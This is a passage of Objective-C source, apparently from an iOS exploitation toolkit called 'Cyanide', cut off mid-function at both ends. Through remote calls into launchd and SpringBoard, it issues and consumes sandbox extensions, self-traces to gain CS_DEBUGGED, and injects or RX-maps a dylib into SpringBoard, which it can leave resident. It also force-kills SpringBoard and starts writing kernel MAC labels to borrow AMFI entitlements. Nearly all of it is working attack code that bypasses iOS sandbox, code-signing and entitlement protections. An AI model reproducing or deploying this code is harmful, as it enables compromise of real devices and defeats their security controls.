                    0, pathLength, 0, 0, 0, 0, 0);
                bool stringsWritten = api->remoteSuccess() &&
                    [session remoteWrite:remoteClass
                        from:tokenClass size:classLength] &&
                    [session remoteWrite:remotePath
                        from:localPath size:pathLength];
                uint64_t remoteToken = stringsWritten
                    ? api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS,
                        "sandbox_extension_issue_file",
                        remoteClass, remotePath, 0,
                        0, 0, 0, 0, 0) : 0;
                uint64_t tokenLength = remoteToken
                    ? api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "strlen", remoteToken,
                        0, 0, 0, 0, 0, 0, 0) : 0;
                if (tokenLength > 0 && tokenLength < 0x4000 &&
                    api->remoteSuccess()) {
                    token = [NSMutableData dataWithLength:tokenLength + 1];
                    if (![session remoteRead:remoteToken
                            to:token.mutableBytes size:token.length]) {
                        token = nil;
                    }
                }
                if (remoteToken && api->remoteSuccess()) {
                    (void)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "free", remoteToken,
                        0, 0, 0, 0, 0, 0, 0);
                }
            }
            if (remotePath && api->remoteSuccess()) {
                (void)api->remoteDlsymCall(
                    CND_REMOTE_TIMEOUT_SECONDS, "free", remotePath,
                    0, 0, 0, 0, 0, 0, 0);
            }
            if (remoteClass && api->remoteSuccess()) {
                (void)api->remoteDlsymCall(
                    CND_REMOTE_TIMEOUT_SECONDS, "free", remoteClass,
                    0, 0, 0, 0, 0, 0, 0);
            }
            healthy = api->remoteSuccess();
        });
    } @catch (NSException *exception) {
        CNDRecord(@"executableGrantException", [NSString stringWithFormat:
            @"%@:%@", exception.name ?: @"exception",
            exception.reason ?: @"unknown"]);
    }

    bool identity = session.pid == 1 && launchdPID == 1 &&
        launchdProc && launchdTask;
    bool closed = CNDTeardownRemoteCallSession(session);
    bool issued = identity && healthy && closed && token.length > 1;
    CNDRecord(@"executableGrantLaunchdIdentityBound", @(identity));
    CNDRecord(@"executableGrantLaunchdSessionClosed", @(closed));
    CNDRecord(@"executableGrantIssued", @(issued));
    CNDRecord(@"executableGrantTokenLength", @(token.length));
    return issued ? [token copy] : nil;
}

static bool CNDResolveSpringBoardIdentityFromRemoteCall(
    const CNDProbeAPI *api, CNDProbeTargetIdentity *identityOut)
{
    if (!api || !identityOut) return false;
    memset(identityOut, 0, sizeof(*identityOut));

    CNDProbeRemoteCallSession *session = CNDCreateSpringBoardSession(api);
    if (!session) {
        CNDRecord(@"springBoardRemoteCallResolverOpened", @NO);
        return false;
    }
    CNDRecord(@"springBoardRemoteCallResolverOpened", @YES);

    CNDProbeTargetIdentity identity = {0};
    bool bound = CNDCopySpringBoardSessionIdentity(
        api, session, &identity);
    CNDRecord(@"springBoardRemoteCallResolverBound", @(bound));
    CNDRecord(@"springBoardRemoteCallResolverPID", @(identity.pid));
    CNDRecord(@"springBoardRemoteCallResolverProc", CNDHex(identity.proc));
    CNDRecord(@"springBoardRemoteCallResolverTask", CNDHex(identity.task));

    bool closed = CNDTeardownRemoteCallSession(session);
    CNDRecord(@"springBoardRemoteCallResolverClosed", @(closed));
    if (!bound || !closed) return false;
    *identityOut = identity;
    return true;
}

static bool CNDReadTargetCSFlagsRemote(const CNDProbeAPI *api, pid_t pid,
    uint64_t expectedProc, uint64_t expectedTask, uint32_t *flagsOut)
{
    if (!api || !flagsOut ||
        !CNDIdentityMatches(api, pid, expectedProc, expectedTask)) return false;
    *flagsOut = 0;
    CNDProbeRemoteCallSession *session = CNDCreateSpringBoardSession(api);
    if (!session) return false;
    CNDProbeTargetIdentity identity = {0};
    bool bound = CNDCopySpringBoardSessionIdentity(
        api, session, &identity) && identity.pid == pid &&
        identity.proc == expectedProc && identity.task == expectedTask;
    __block bool read = false;
    if (bound) {
        @try {
            api->withSession(session, ^{
                uint64_t status = api->remoteDlsymCall(
                    CND_REMOTE_TIMEOUT_SECONDS, "malloc", sizeof(uint32_t),
                    0, 0, 0, 0, 0, 0, 0);
                if (!status || !api->remoteSuccess()) return;
                (void)api->remoteDlsymCall(CND_REMOTE_TIMEOUT_SECONDS,
                    "memset", status, 0, sizeof(uint32_t), 0, 0, 0, 0, 0);
                int64_t result = (int64_t)api->remoteDlsymCall(
                    CND_REMOTE_TIMEOUT_SECONDS, "csops", (uint64_t)pid,
                    CND_CS_OPS_STATUS, status, sizeof(uint32_t), 0, 0, 0, 0);
                read = result == 0 && api->remoteSuccess() &&
                    [session remoteRead:status to:flagsOut
                        size:sizeof(*flagsOut)];
                if (api->remoteSuccess()) {
                    (void)api->remoteDlsymCall(CND_REMOTE_TIMEOUT_SECONDS,
                        "free", status, 0, 0, 0, 0, 0, 0, 0);
                }
            });
        } @catch (NSException *exception) {
            CNDRecord(@"csStatusRemoteException",
                [NSString stringWithFormat:@"%@:%@",
                    exception.name ?: @"exception",
                    exception.reason ?: @"unknown"]);
        }
    }
    bool closed = CNDTeardownRemoteCallSession(session);
    return read && closed;
}

static NSString *CNDReadRemoteCString(
    CNDProbeRemoteCallSession *session, uint64_t address)
{
    if (!session || !address) return @"";
    char text[512] = {0};
    if (![session remoteRead:address to:text size:sizeof(text) - 1]) {
        return @"<remote string unreadable>";
    }
    text[sizeof(text) - 1] = '\0';
    return [NSString stringWithUTF8String:text] ?: @"<invalid UTF-8>";
}

static int CNDReadRemoteErrno(const CNDProbeAPI *api,
    CNDProbeRemoteCallSession *session)
{
    if (!api || !session) return 0;
    uint64_t address = api->remoteDlsymCall(
        CND_REMOTE_TIMEOUT_SECONDS, "__error",
        0, 0, 0, 0, 0, 0, 0, 0);
    uint32_t value = 0;
    return address && [session remoteRead:address to:&value size:sizeof(value)]
        ? (int)value : 0;
}

static bool CNDRunSpringBoardDylibProbe(const CNDProbeAPI *api, pid_t pid,
    uint64_t expectedProc, uint64_t expectedTask)
{
    NSString *path = [NSBundle.mainBundle.bundlePath
        stringByAppendingPathComponent:@CND_SPRINGBOARD_DYLIB_PROBE_NAME];
    CNDRecord(@"dylibProbePath", path ?: @"");
    if (!api || path.length == 0 ||
        ![[NSFileManager defaultManager] fileExistsAtPath:path]) {
        CNDRecord(@"result", @"refused-dylib-probe-missing");
        return false;
    }
    CNDProbeDylibLayout layout = {0};
    bool layoutResolved = CNDResolveProbeDylibLayout(path, &layout);
    CNDRecord(@"dylibProbeLayoutResolved", @(layoutResolved));
    CNDRecord(@"dylibProbeSliceOffset", CNDHex(layout.sliceOffset));
    CNDRecord(@"dylibProbeTextFileOffset",
        CNDHex(layout.textFileOffset));
    CNDRecord(@"dylibProbeTextFileSize", CNDHex(layout.textFileSize));
    CNDRecord(@"dylibProbeSymbolOffset", CNDHex(layout.symbolOffset));
    if (!layoutResolved) {
        CNDRecord(@"result", @"refused-dylib-probe-layout");
        return false;
    }
    NSData *executableToken = CNDIssueExecutableToken(api, path);
    if (executableToken.length <= 1) {
        CNDRecord(@"result", @"refused-executable-grant-unavailable");
        return false;
    }
    uint32_t preflightCSFlags = 0;
    bool preflightCSFlagsReadable = CNDReadTargetCSFlagsRemote(
        api, pid, expectedProc, expectedTask, &preflightCSFlags);
    bool alreadyDebugged = preflightCSFlagsReadable &&
        (preflightCSFlags & CND_CS_DEBUGGED) != 0;
    CNDRecord(@"dylibProbePreflightCSFlagsReadable",
        @(preflightCSFlagsReadable));
    CNDRecord(@"dylibProbePreflightCSFlags", CNDHex(preflightCSFlags));
    CNDRecord(@"launchdAttachSkippedAlreadyDebugged", @(alreadyDebugged));
    bool launchdAttachCompleted = alreadyDebugged ? false :
        CNDEnableSpringBoardThroughLaunchdAttach(
            api, pid, expectedProc, expectedTask);
    CNDRecord(@"launchdAttachCompleted", @(launchdAttachCompleted));

    CNDProbeRemoteCallSession *session = CNDCreateSpringBoardSession(api);
    if (!session) {
        CNDRecord(@"dylibProbeSessionOpened", @NO);
        CNDRecord(@"result", @"failed-dylib-probe-remotecall-unavailable");
        return false;
    }
    CNDRecord(@"dylibProbeSessionOpened", @YES);
    CNDProbeTargetIdentity identity = {0};
    bool bound = CNDCopySpringBoardSessionIdentity(
        api, session, &identity) && identity.pid == pid &&
        identity.proc == expectedProc && identity.task == expectedTask;
    CNDRecord(@"dylibProbeIdentityBound", @(bound));

    __block bool pathWritten = false;
    __block int64_t openResult = -1;
    __block int openErrno = 0;
    __block uint64_t handle = 0;
    __block NSString *loadError = @"";
    __block uint64_t symbol = 0;
    __block uint64_t markerResult = 0;
    __block int64_t closeResult = -1;
    __block uint64_t signedMapAddress = 0;
    __block int signedMapErrno = 0;
    __block uint64_t signedMapMarkerResult = 0;
    __block int64_t signedMapUnmapResult = -1;
    __block bool executableGrantConsumed = false;
    __block int64_t executableGrantHandle = -1;
    __block int64_t executableGrantReleaseResult = -1;
    __block bool selfTraceStatusBeforeReadable = false;
    __block bool selfTraceStatusAfterReadable = false;
    __block uint32_t selfTraceFlagsBefore = 0;
    __block uint32_t selfTraceFlagsAfter = 0;
    __block int selfTraceParentPID = 0;
    __block bool selfTraceAttempted = false;
    __block int64_t selfTraceResult = -1;
    __block int selfTraceErrno = 0;
    __block bool selfTraceAllowed = false;
    __block bool dylibLeftResident = false;
    __block bool transportHealthy = false;
    uint64_t expectedMarker = CND_SPRINGBOARD_DYLIB_CHALLENGE ^
        CND_SPRINGBOARD_DYLIB_COOKIE;
    if (bound) {
        @try {
            api->withSession(session, ^{
                const char *localPath = path.fileSystemRepresentation;
                size_t pathLength = localPath ? strlen(localPath) + 1 : 0;
                uint64_t remotePath = pathLength ? api->remoteDlsymCall(
                    CND_REMOTE_TIMEOUT_SECONDS, "malloc", pathLength,
                    0, 0, 0, 0, 0, 0, 0) : 0;
                if (remotePath && api->remoteSuccess()) {
                    (void)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "memset", remotePath,
                        0, pathLength, 0, 0, 0, 0, 0);
                    pathWritten = api->remoteSuccess() &&
                        [session remoteWrite:remotePath
                            from:localPath size:pathLength];
                }

                uint64_t remoteToken = api->remoteDlsymCall(
                    CND_REMOTE_TIMEOUT_SECONDS, "malloc",
                    executableToken.length, 0, 0, 0, 0, 0, 0, 0);
                if (remoteToken && api->remoteSuccess()) {
                    (void)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "memset", remoteToken,
                        0, executableToken.length, 0, 0, 0, 0, 0);
                    if (api->remoteSuccess() &&
                        [session remoteWrite:remoteToken
                            from:executableToken.bytes
                            size:executableToken.length]) {
                        executableGrantHandle =
                            (int64_t)api->remoteDlsymCall(
                                CND_REMOTE_TIMEOUT_SECONDS,
                                "sandbox_extension_consume", remoteToken,
                                0, 0, 0, 0, 0, 0, 0);
                        executableGrantConsumed =
                            executableGrantHandle >= 0 &&
                            api->remoteSuccess();
                    }
                    if (api->remoteSuccess()) {
                        (void)api->remoteDlsymCall(
                            CND_REMOTE_TIMEOUT_SECONDS, "free", remoteToken,
                            0, 0, 0, 0, 0, 0, 0);
                    }
                }

                uint64_t statusAddress = api->remoteDlsymCall(
                    CND_REMOTE_TIMEOUT_SECONDS, "malloc", sizeof(uint32_t),
                    0, 0, 0, 0, 0, 0, 0);
                if (statusAddress && api->remoteSuccess()) {
                    (void)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "memset", statusAddress,
                        0, sizeof(uint32_t), 0, 0, 0, 0, 0);
                    int64_t beforeResult = (int64_t)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "csops", (uint64_t)pid,
                        CND_CS_OPS_STATUS, statusAddress, sizeof(uint32_t),
                        0, 0, 0, 0);
                    selfTraceStatusBeforeReadable = beforeResult == 0 &&
                        api->remoteSuccess() &&
                        [session remoteRead:statusAddress
                            to:&selfTraceFlagsBefore
                            size:sizeof(selfTraceFlagsBefore)];
                    selfTraceParentPID = (int)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "getppid",
                        0, 0, 0, 0, 0, 0, 0, 0);
                    if (selfTraceStatusBeforeReadable &&
                        (selfTraceFlagsBefore & CND_CS_DEBUGGED) != 0) {
                        selfTraceResult = 0;
                    } else if (selfTraceStatusBeforeReadable &&
                        selfTraceParentPID == 1 && api->remoteSuccess()) {
                        selfTraceAttempted = true;
                        selfTraceResult = (int64_t)api->remoteDlsymCall(
                            CND_REMOTE_TIMEOUT_SECONDS, "ptrace",
                            CND_PT_TRACE_ME, 0, 0, 0, 0, 0, 0, 0);
                        if (selfTraceResult < 0 && api->remoteSuccess()) {
                            selfTraceErrno = CNDReadRemoteErrno(api, session);
                        }
                    }
                    if (selfTraceResult == 0 && api->remoteSuccess()) {
                        (void)api->remoteDlsymCall(
                            CND_REMOTE_TIMEOUT_SECONDS, "memset",
                            statusAddress, 0, sizeof(uint32_t),
                            0, 0, 0, 0, 0);
                        int64_t afterResult = (int64_t)api->remoteDlsymCall(
                            CND_REMOTE_TIMEOUT_SECONDS, "csops",
                            (uint64_t)pid, CND_CS_OPS_STATUS,
                            statusAddress, sizeof(uint32_t), 0, 0, 0, 0);
                        selfTraceStatusAfterReadable = afterResult == 0 &&
                            api->remoteSuccess() &&
                            [session remoteRead:statusAddress
                                to:&selfTraceFlagsAfter
                                size:sizeof(selfTraceFlagsAfter)];
                    }
                    if (api->remoteSuccess()) {
                        (void)api->remoteDlsymCall(
                            CND_REMOTE_TIMEOUT_SECONDS, "free",
                            statusAddress, 0, 0, 0, 0, 0, 0, 0);
                    }
                }
                selfTraceAllowed = selfTraceStatusAfterReadable &&
                    (selfTraceFlagsAfter & CND_CS_DEBUGGED) != 0;

                /* File access and signed-vnode RX admission are independent
                 * boundaries from dyld library validation. Always prove the
                 * grant with open(2); keep dlopen behind CS_DEBUGGED, but let
                 * the kernel answer the direct signed RX mmap question even
                 * when both ptrace routes returned EPERM. */
                if (pathWritten && executableGrantConsumed &&
                    api->remoteSuccess()) {
                    openResult = (int64_t)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "open", remotePath,
                        O_RDONLY | O_CLOEXEC, 0, 0, 0, 0, 0, 0);
                    if (openResult < 0 && api->remoteSuccess()) {
                        openErrno = CNDReadRemoteErrno(api, session);
                    }
                    if (openResult >= 0 && api->remoteSuccess()) {
                        (void)api->remoteDlsymCall(
                            CND_REMOTE_TIMEOUT_SECONDS, "close",
                            (uint64_t)openResult, 0, 0, 0, 0, 0, 0, 0);
                    }
                }

                if (pathWritten && executableGrantConsumed &&
                    selfTraceAllowed && api->remoteSuccess()) {
                    (void)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "dlerror",
                        0, 0, 0, 0, 0, 0, 0, 0);
                    handle = api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "dlopen", remotePath,
                        RTLD_NOW | RTLD_LOCAL, 0, 0, 0, 0, 0, 0);
                    if (!handle && api->remoteSuccess()) {
                        uint64_t errorAddress = api->remoteDlsymCall(
                            CND_REMOTE_TIMEOUT_SECONDS, "dlerror",
                            0, 0, 0, 0, 0, 0, 0, 0);
                        loadError = CNDReadRemoteCString(
                            session, errorAddress);
                    }
                }

                /* Ask the target kernel to map the exact signed arm64e
                 * __TEXT slice RX regardless of ptrace outcome. The page is
                 * never writable and is never copied through Cyanide's
                 * physical aperture. This cleanly separates vnode execution
                 * admission from dyld's platform/team library validation. */
                if (!handle && pathWritten && executableGrantConsumed &&
                    api->remoteSuccess()) {
                    CNDRecord(@"signedVnodeAttemptWithoutCSDebugged",
                        @(!selfTraceAllowed));
                    int64_t mapFD = (int64_t)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "open", remotePath,
                        O_RDONLY | O_CLOEXEC, 0, 0, 0, 0, 0, 0);
                    uint64_t pageSize = mapFD >= 0 ? api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "getpagesize",
                        0, 0, 0, 0, 0, 0, 0, 0) : 0;
                    uint64_t absoluteOffset = layout.sliceOffset +
                        layout.textFileOffset;
                    uint64_t mappingLength = pageSize &&
                        (pageSize & (pageSize - 1)) == 0
                        ? (layout.textFileSize + pageSize - 1) &
                            ~(pageSize - 1) : 0;
                    if (mapFD >= 0 && mappingLength &&
                        absoluteOffset % pageSize == 0 &&
                        api->remoteSuccess()) {
                        signedMapAddress = api->remoteDlsymCall(
                            CND_REMOTE_TIMEOUT_SECONDS, "mmap", 0,
                            mappingLength, PROT_READ | PROT_EXEC,
                            MAP_PRIVATE, (uint64_t)mapFD, absoluteOffset,
                            0, 0);
                        if (signedMapAddress == UINT64_MAX &&
                            api->remoteSuccess()) {
                            signedMapErrno = CNDReadRemoteErrno(api, session);
                        }
                        CNDRecord(@"signedVnodeMapAddress",
                            CNDHex(signedMapAddress));
                        CNDRecord(@"signedVnodeMapErrno", @(signedMapErrno));
                        if (signedMapAddress &&
                            signedMapAddress != UINT64_MAX &&
                            api->remoteSuccess()) {
                            CNDRecord(@"signedVnodeExecutionAttempted", @YES);
                            signedMapMarkerResult =
                                [session doRemoteCallStableWithTimeout:
                                    CND_REMOTE_TIMEOUT_SECONDS
                                    functionAddress:signedMapAddress +
                                        layout.symbolOffset
                                    functionName:
                                        "cnd_signed_vnode_probe"
                                    x0:CND_SPRINGBOARD_DYLIB_CHALLENGE
                                    x1:0 x2:0 x3:0 x4:0 x5:0 x6:0 x7:0];
                            CNDRecord(@"signedVnodeMarkerResult",
                                CNDHex(signedMapMarkerResult));
                            CNDRecord(@"signedVnodeMarkerMatched",
                                @(signedMapMarkerResult == expectedMarker));
                            if (api->remoteSuccess() &&
                                CNDIdentityMatches(api, pid,
                                    expectedProc, expectedTask)) {
                                signedMapUnmapResult =
                                    (int64_t)api->remoteDlsymCall(
                                        CND_REMOTE_TIMEOUT_SECONDS,
                                        "munmap", signedMapAddress,
                                        mappingLength,
                                        0, 0, 0, 0, 0, 0);
                            }
                        }
                    }
                    if (mapFD >= 0 && api->remoteSuccess()) {
                        (void)api->remoteDlsymCall(
                            CND_REMOTE_TIMEOUT_SECONDS, "close",
                            (uint64_t)mapFD, 0, 0, 0, 0, 0, 0, 0);
                    }
                }

                const char *localSymbol = CND_SPRINGBOARD_DYLIB_PROBE_SYMBOL;
                size_t symbolLength = strlen(localSymbol) + 1;
                uint64_t remoteSymbol = handle ? api->remoteDlsymCall(
                    CND_REMOTE_TIMEOUT_SECONDS, "malloc", symbolLength,
                    0, 0, 0, 0, 0, 0, 0) : 0;
                if (remoteSymbol && api->remoteSuccess()) {
                    (void)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "memset", remoteSymbol,
                        0, symbolLength, 0, 0, 0, 0, 0);
                    if ([session remoteWrite:remoteSymbol
                            from:localSymbol size:symbolLength]) {
                        symbol = api->remoteDlsymCall(
                            CND_REMOTE_TIMEOUT_SECONDS, "dlsym", handle,
                            remoteSymbol, 0, 0, 0, 0, 0, 0);
                    }
                }
                if (symbol && api->remoteSuccess()) {
                    markerResult = [session doRemoteCallStableWithTimeout:
                        CND_REMOTE_TIMEOUT_SECONDS functionAddress:symbol
                        functionName:CND_SPRINGBOARD_DYLIB_PROBE_SYMBOL
                        x0:CND_SPRINGBOARD_DYLIB_CHALLENGE
                        x1:0 x2:0 x3:0 x4:0 x5:0 x6:0 x7:0];
                }
                if (remoteSymbol && api->remoteSuccess()) {
                    (void)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "free", remoteSymbol,
                        0, 0, 0, 0, 0, 0, 0);
                }
                if (handle && markerResult == expectedMarker &&
                    api->remoteSuccess()) {
                    dylibLeftResident = true;
                } else if (handle && api->remoteSuccess()) {
                    closeResult = (int64_t)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "dlclose", handle,
                        0, 0, 0, 0, 0, 0, 0);
                }
                if (executableGrantConsumed && api->remoteSuccess()) {
                    executableGrantReleaseResult =
                        (int64_t)api->remoteDlsymCall(
                            CND_REMOTE_TIMEOUT_SECONDS,
                            "sandbox_extension_release",
                            (uint64_t)executableGrantHandle,
                            0, 0, 0, 0, 0, 0, 0);
                }
                if (remotePath && api->remoteSuccess()) {
                    (void)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "free", remotePath,
                        0, 0, 0, 0, 0, 0, 0);
                }
                transportHealthy = api->remoteSuccess();
            });
        } @catch (NSException *exception) {
            loadError = [NSString stringWithFormat:@"%@:%@",
                exception.name ?: @"exception",
                exception.reason ?: @"unknown"];
        }
    }

    /* Identity delivery remains installed for the bounded original-thread
     * transport on physical 23A341. Do not close its receive right while
     * this SpringBoard incarnation is alive. The marker is already durable,
     * so dispatch an exact-identity self-SIGKILL through the same proven
     * transport and abandon local state only after kernel identity exit. */
    bool identityStableBeforeCleanup = CNDIdentityMatches(
        api, pid, expectedProc, expectedTask);
    int terminalDispatch = 0;
    bool reset = false;
    if (identityStableBeforeCleanup && [session hasLocalState]) {
        terminalDispatch = [session dispatchSelfSIGKILLForExpectedPID:pid
            proc:expectedProc task:expectedTask report:NULL];
        reset = terminalDispatch == 1 && CNDWaitForIdentityExit(
            api, pid, expectedProc, expectedTask);
    }
    if (reset) [session abandonRemoteCall];
    bool closed = reset ? ![session hasLocalState]
        : CNDTeardownRemoteCallSession(session);
    int64_t selfTraceStopResult = 0;
    int selfTraceStopErrno = 0;
    int64_t selfTraceDetachResult = 0;
    int selfTraceDetachErrno = 0;
    int64_t selfTraceContinueResult = 0;
    int selfTraceContinueErrno = 0;
    bool selfTraceCleanupOK = true;
    bool traceMayBeActive = !reset && selfTraceAttempted &&
        (selfTraceResult == 0 || !transportHealthy || !closed);
    if (traceMayBeActive) {
        selfTraceCleanupOK = CNDFinishSpringBoardSelfTraceViaLaunchd(
            api, pid, &selfTraceStopResult, &selfTraceStopErrno,
            &selfTraceDetachResult, &selfTraceDetachErrno,
            &selfTraceContinueResult, &selfTraceContinueErrno);
    }
    bool executed = bound && pathWritten && openResult >= 0 && handle &&
        symbol && markerResult == expectedMarker &&
        (dylibLeftResident || closeResult == 0) &&
        transportHealthy && closed && selfTraceCleanupOK &&
        identityStableBeforeCleanup && reset;
    bool signedVnodeExecuted = bound && pathWritten && openResult >= 0 &&
        executableGrantConsumed &&
        signedMapAddress && signedMapAddress != UINT64_MAX &&
        signedMapMarkerResult == expectedMarker &&
        signedMapUnmapResult == 0 && transportHealthy && closed &&
        selfTraceCleanupOK && identityStableBeforeCleanup && reset;
    CNDRecord(@"dylibProbePathWritten", @(pathWritten));
    CNDRecord(@"dylibProbeOpenResult", @(openResult));
    CNDRecord(@"dylibProbeOpenErrno", @(openErrno));
    CNDRecord(@"dylibProbeHandle", CNDHex(handle));
    CNDRecord(@"dylibProbeLoadError", loadError ?: @"");
    CNDRecord(@"dylibProbeSymbol", CNDHex(symbol));
    CNDRecord(@"dylibProbeMarkerResult", CNDHex(markerResult));
    CNDRecord(@"dylibProbeExpectedMarker", CNDHex(expectedMarker));
    CNDRecord(@"dylibProbeCloseResult", @(closeResult));
    CNDRecord(@"dylibProbeLeftResident", @(dylibLeftResident));
    CNDRecord(@"executableGrantConsumed", @(executableGrantConsumed));
    CNDRecord(@"executableGrantHandle", @(executableGrantHandle));
    CNDRecord(@"executableGrantReleaseResult",
        @(executableGrantReleaseResult));
    CNDRecord(@"signedVnodeMapAddress", CNDHex(signedMapAddress));
    CNDRecord(@"signedVnodeMapErrno", @(signedMapErrno));
    CNDRecord(@"signedVnodeMarkerResult",
        CNDHex(signedMapMarkerResult));
    CNDRecord(@"signedVnodeUnmapResult", @(signedMapUnmapResult));
    CNDRecord(@"signedVnodeExecutionSuccess", @(signedVnodeExecuted));
    CNDRecord(@"selfTraceStatusBeforeReadable",
        @(selfTraceStatusBeforeReadable));
    CNDRecord(@"selfTraceStatusAfterReadable",
        @(selfTraceStatusAfterReadable));
    CNDRecord(@"selfTraceFlagsBefore", CNDHex(selfTraceFlagsBefore));
    CNDRecord(@"selfTraceFlagsAfter", CNDHex(selfTraceFlagsAfter));
    CNDRecord(@"selfTraceParentPID", @(selfTraceParentPID));
    CNDRecord(@"selfTraceAttempted", @(selfTraceAttempted));
    CNDRecord(@"selfTraceResult", @(selfTraceResult));
    CNDRecord(@"selfTraceErrno", @(selfTraceErrno));
    CNDRecord(@"selfTraceAllowed", @(selfTraceAllowed));
    CNDRecord(@"codeSignAllowanceObserved", @(selfTraceAllowed));
    CNDRecord(@"selfTraceStopResult", @(selfTraceStopResult));
    CNDRecord(@"selfTraceStopErrno", @(selfTraceStopErrno));
    CNDRecord(@"selfTraceDetachResult", @(selfTraceDetachResult));
    CNDRecord(@"selfTraceDetachErrno", @(selfTraceDetachErrno));
    CNDRecord(@"selfTraceContinueResult", @(selfTraceContinueResult));
    CNDRecord(@"selfTraceContinueErrno", @(selfTraceContinueErrno));
    CNDRecord(@"selfTraceCleanupVerified", @(selfTraceCleanupOK));
    CNDRecord(@"springBoardIdentityStableBeforeCleanup",
        @(identityStableBeforeCleanup));
    CNDRecord(@"dylibProbeTerminalDispatch", @(terminalDispatch));
    CNDRecord(@"springBoardFinalResetProven", @(reset));
    CNDRecord(@"dylibProbeTransportHealthy", @(transportHealthy));
    CNDRecord(@"dylibProbeSessionClosed", @(closed));
    CNDRecord(@"dylibProbeExecutionSuccess", @(executed));
    CNDRecord(@"result", executed
        ? @"success-springboard-dylib-injected-resident"
        : (signedVnodeExecuted
            ? @"success-springboard-signed-vnode-executed"
            : (selfTraceAllowed
                ? @"failed-springboard-dylib-not-loaded-after-self-trace"
                : (signedMapAddress == UINT64_MAX
                    ? @"failed-springboard-signed-vnode-rx-denied"
                    : @"failed-springboard-self-trace-not-authorized"))));
    return executed || signedVnodeExecuted;
}

static bool CNDWaitForStop(pid_t pid, int *statusOut)
{
    for (unsigned int attempt = 0; attempt < 60; attempt++) {
        int status = 0;
        pid_t result = waitpid(pid, &status, WNOHANG | WUNTRACED);
        if (result == pid) {
            if (statusOut) *statusOut = status;
            return WIFSTOPPED(status);
        }
        if (result < 0) return false;
        usleep(50000);
    }
    return false;
}

static bool CNDWaitForIdentityExit(const CNDProbeAPI *api, pid_t pid,
    uint64_t expectedProc, uint64_t expectedTask)
{
    for (unsigned int attempt = 0; attempt < 100; attempt++) {
        if (!CNDIdentityMatches(
                api, pid, expectedProc, expectedTask)) return true;
        usleep(50000);
    }
    return false;
}

static bool CNDForceSpringBoardRestart(const CNDProbeAPI *api, pid_t pid,
    uint64_t expectedProc, uint64_t expectedTask)
{
    if (!CNDIdentityMatches(
            api, pid, expectedProc, expectedTask)) return true;
    errno = 0;
    int signalResult = kill(pid, SIGKILL);
    CNDRecord(@"fallbackSpringBoardKillResult", @(signalResult));
    CNDRecord(@"fallbackSpringBoardKillErrno", @(errno));
    if (signalResult == 0 && CNDWaitForIdentityExit(
            api, pid, expectedProc, expectedTask)) {
        return true;
    }

    errno = 0;
    int attach = ptrace(CND_PT_ATTACHEXC, pid, NULL, 0);
    CNDRecord(@"fallbackSpringBoardReattachResult", @(attach));
    CNDRecord(@"fallbackSpringBoardReattachErrno", @(errno));
    if (attach == 0) {
        int status = 0;
        if (CNDWaitForStop(pid, &status)) {
            errno = 0;
            int killResult = ptrace(CND_PT_KILL, pid, NULL, 0);
            CNDRecord(@"fallbackSpringBoardPtraceKillResult", @(killResult));
            CNDRecord(@"fallbackSpringBoardPtraceKillErrno", @(errno));
        }
    }
    return CNDWaitForIdentityExit(
        api, pid, expectedProc, expectedTask);
}

typedef struct {
    uint64_t selfProc;
    uint64_t selfLabel;
    uint64_t targetLabel;
    uint64_t targetSlotAddress;
    uint64_t donorAMFIObject;
    uint64_t originalAMFIObject;
    uint8_t originalLabel[CND_MAC_LABEL_SIZE];
    uint8_t borrowedLabel[CND_MAC_LABEL_SIZE];
    bool originalLabelCaptured;
    bool writeAttempted;
    bool installed;
    bool restored;
} CNDAMFIEntitlementBorrow;

static bool CNDReadMACLabel(const CNDProbeAPI *api, uint64_t label,
    uint8_t bytes[CND_MAC_LABEL_SIZE])
{
    if (!api || !api->kreadbuf || !CNDKernelObjectPointer(label) ||
        !bytes) return false;
    memset(bytes, 0, CND_MAC_LABEL_SIZE);
    api->kreadbuf(label, bytes, CND_MAC_LABEL_SIZE);
    return true;
}

static bool CNDWriteAndVerifyMACLabel(const CNDProbeAPI *api,
    uint64_t label, const uint8_t desired[CND_MAC_LABEL_SIZE])
{
    if (!api || !api->kwrite32BytesChecked || !desired ||
        !CNDKernelObjectPointer(label)) return false;
    if (!api->kwrite32BytesChecked(label, desired)) return false;

    uint8_t observed[CND_MAC_LABEL_SIZE] = {0};
    return CNDReadMACLabel(api, label, observed) &&
        memcmp(observed, desired, CND_MAC_LABEL_SIZE) == 0;
}

static bool CNDRestoreAMFIEntitlementBorrow(const CNDProbeAPI *api,
    CNDAMFIEntitlementBorrow *borrow)
{
    if (!api || !api->amfiSlotOffset || !borrow ||
        !borrow->originalLabelCaptured || !borrow->targetLabel) return false;

    uint8_t current[CND_MAC_LABEL_SIZE] = {0};
    if (CNDReadMACLabel(api, borrow->targetLabel, current) &&
        memcmp(current, borrow->originalLabel, CND_MAC_LABEL_SIZE) == 0) {
        borrow->restored = true;
    }
    for (unsigned int attempt = 0;
         !borrow->restored && attempt < 3; attempt++) {
        borrow->restored = CNDWriteAndVerifyMACLabel(
            api, borrow->targetLabel, borrow->originalLabel);
    }

    memset(current, 0, sizeof(current));
    bool finalRead = CNDReadMACLabel(api, borrow->targetLabel, current);
    bool finalExact = finalRead && memcmp(
        current, borrow->originalLabel, CND_MAC_LABEL_SIZE) == 0;
    borrow->restored = borrow->restored && finalExact;
    uint64_t finalObject = 0;
    if (finalRead) {
        memcpy(&finalObject, current + *api->amfiSlotOffset,
            sizeof(finalObject));
    }
